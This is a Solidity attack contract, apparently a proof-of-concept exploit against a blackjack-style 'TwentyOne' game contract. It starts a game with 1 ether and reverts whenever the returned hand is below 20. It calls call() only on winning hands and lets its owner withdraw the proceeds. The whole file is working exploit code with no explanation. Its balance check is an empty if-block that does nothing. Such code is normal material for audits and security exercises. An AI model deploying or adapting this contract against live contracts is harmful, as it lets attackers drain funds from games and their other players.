// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

contract AttackTwentyOne {
    error AttackTwentyOne__FailedCallStartGame();
    error AttackTwentyOne__FailedCallToCall();
    error AttackTwentyOne__RevertLessThen20(uint256 playerHand);
    error AttackTwentyOne__LowBalanceOfTwentyOneContract();

    uint256 private s_playerHand;
    uint256 private constant MAX_PLAYER_HAND = 20;
    address private immutable i_owner;
    address payable immutable i_twentyOneContract;

    constructor(address _twentyOneContract, address _owner) {
        i_twentyOneContract = payable(_twentyOneContract);
        i_owner = _owner;
    }

    receive() external payable {}

    function callTostartGameAndCall() external {
        if (address(i_twentyOneContract).balance < 1 ether) {}

        (bool success, bytes memory data) = i_twentyOneContract.call{
            value: 1 ether
        }(abi.encodeWithSignature("startGame()"));

        if (!success) {
            revert AttackTwentyOne__FailedCallStartGame();
        }

        s_playerHand = abi.decode(data, (uint256));

        if (s_playerHand < MAX_PLAYER_HAND) {
            revert AttackTwentyOne__RevertLessThen20(s_playerHand);
        }

        (bool success2, ) = i_twentyOneContract.call(
            abi.encodeWithSignature("call()")
        );
        if (!success2) {
            revert AttackTwentyOne__FailedCallToCall();
        }
    }

    function withdrawAll() external {
        require(msg.sender == i_owner, "Not Owner");
        payable(i_owner).transfer(address(this).balance);
    }
}
